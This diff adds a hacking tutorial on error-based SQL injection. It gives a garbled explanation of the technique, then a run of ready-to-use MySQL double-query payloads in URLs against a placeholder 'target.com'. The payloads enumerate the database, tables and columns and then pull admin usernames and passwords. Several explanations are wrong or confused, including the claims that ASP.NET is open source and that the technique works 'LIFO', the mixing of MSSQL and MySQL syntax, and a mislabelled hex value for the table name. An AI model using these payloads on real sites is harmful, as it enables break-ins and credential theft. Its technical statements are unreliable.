@@ -1,0 +1,126 @@
+ERROR BASED SQL INJECTION
+==========================
+Error based SQL Injection is type of SQL Injection technique to make the error message show Data in just the form of Database Errors instead of SQL Syntax error like in Union Based, for when we have a blind vulnerability that shows error, so we can extract sensitive data from the database directly.
+
+The errors are very useful during the time of development of a web application but they should be disabled on a Live Website, because errors always shows the Internal Sensitive Data of the Database. 
+
+Error Based SQL Injection works on the ASP Technology (asp.net , aspx) which is a open source server side web application Developed by Microsoft, using the Microsoft MSSQL Server. 
+
+
+TRUE CONDITION :
+---------------
+
+Here 1 is True and 0 is False. 
+
+AND GATE REPRESENTATION
+
+A    |    B    |    Resultant |
+------------------------------|
+0    |    0    |    0         |
+0    |    1    |    0         |    
+1    |    0    |    0         |
+1    |    1    |    1         |
+
+Checking the Last True Condition it states : 
+
+1 & 1  = 1    ie;   1*1=1  or True*True = True 
+ 
+MAKING THIS TRUE CONDITION FALSE
+
+1 & 0  = 0    ie;   1*0=0  or True*False = False 
+
+
+Error Based SQL Injection works by generating a error condition in the SQL Syntax, so that the Database reverts back with the Error along with the Sensitive Data.
+
+
+DEMONSTRATION
+===============
+
+Normally a SQL Syntax can goes like :  
+
+?id=10  |  ?id=10 and 1 =1 ;			//TRUE
+Which means a Condition is true and it will revert a Genuine Website.
+
+- So, we can change and can create a Error in the SQL Command by : 
+        ?id=10 and 1=0;					//FALSE
+Which will create and revert a Errors of the Database.
+
+CONDITIONS OF ERROR BASED SQLI
+===============================
+= Only One Query can execute at a Particular time, not like finding out the Table Names etc we do on Union Based.
+= It works on the basis of Last In First Out (LIFO).
+= Only the Top Table of the Database can be accessed at a single particular time. Same  goes for Columns and then for Rows.
+
+----
+First as same as Union Based SQLI, we start finding the number of columns and the Vulnerable column. Suppose the vulnerable column is 10.
+
+After creating a Error, We will start executing the command and extracting the data from the First Table from the Database.
+
+For selecting the Top First Table (Cause we cannot directly go a “n” number column), 
+
+=	?id=10 and 1=0 select top 1 table_name from information_schema.tables
+
+This will extract and give the Data of the First Table from the Database Including its name and other entities. If the Data is Juicy then extract it, else we go for the next tables and columns.
+
+----
+
+For deselecting the Top/Current Table and selecting/extracting the next table, 
+
+=	?id=10 and 1=0 select top 1 table_name from information_schema.tables where table_name not in (“Name of the previous tables”)
+
+Here we are selecting the next Top Table excluding the Previous one and then extracting its data through the Database Errors. For eg. if the First Top Table is named as “Images”, the query will be :  
+?id=10 and 1=0 select top 1 table_name from information_schema.tables where table_name not in (“images”, "guestbook")
+
+----
+
+After getting through our Juicy Table, we go for the data which are situated in there columns.
+
+=	?id=10 and 1=0 select top 1 column_name from information_schema.columns where table_name not in (“images”)
+
+Here we get the data of the extracted of the Columns which are not of the Table named Images.
+
+DEMO
+====
+
+http://www.target.com/index.php?id=-1 Union Select 1,2,3,4,5,6--+
+
+http://www.target.com/index.php?id=1 or 1 group by concat_ws(0x3a,version(),floor(rand(0)*2)) having min(0) or 1--+
+		we Will Get The Version Printed on The WebPage
+
+
+http://www.target.com/index.php?id=1 and (select 1 from (select count(*),concat((select(select concat(cast(database() as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+
+		Here is Our Query To Get The  Database.
+
+
+http://www.target.com/index.php?id=1 and (select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+
+		Now We Have To Get The Tables. As We Want Tables From Primary Database .
+		Here Is The Query For Tables From Primary Database.
+
+		Increase The Value Of Limit as LIMIT 0,1 to LIMIT 1,1 LIMIT 2,1 LIMIT 3,1 Until You Get Your Desired Table Name .
+
+
+http://www.target.com/index.php?id=1 and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name=0xADMIN limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+
+		Now We Have to Get The Column Names From The Table Name. We Got Table Of Admin. So Lets Get The Columns From Table Admin . Here Is The Query For Getting Column Names From The Table Admin. 
+
+		To Get The Columns From The Table Admin we Have to Encode It In HEX and Then We Can Execute Our Query.
+		Here Is that PART in Our Query.
+
+		Table_name=ADMIN
+		Here Is The HEX Value of ADMIN=61646d696e
+		And Put it With 0x to Build Our Correct Query.
+
+
+http://www.target.com/index.php?id=1 and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name=0x61646d696e limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+
+		Increase The Value Of LIMIT to LIMIT 0,1 LIMIT 1,1 LIMIT 2,1 until we Get The Column Name Like Username and Password.
+
+
+http://www.target.com/index.php?id=1 and (select 1 from (select count(*),concat((select(select concat(cast(concat(COLUMN_NAME_1,0x3a,COLUMN_NAME_2) as char),0x3a)) from TABLENAME limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+
+		After We Get The Column names Like Username And Password. Next Step Is To Extract Data From These Columns.
+
+		WE Put The TABLENAME=Admin
+		And 	
+		Column_name_1=username
+		Column_name_2=password
+
+
+http://www.target.com/index.php?id=1 and (select 1 from (select count(*),concat((select(select concat(cast(concat(username,0x3a,password) as char),0x3a)) from admin limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+
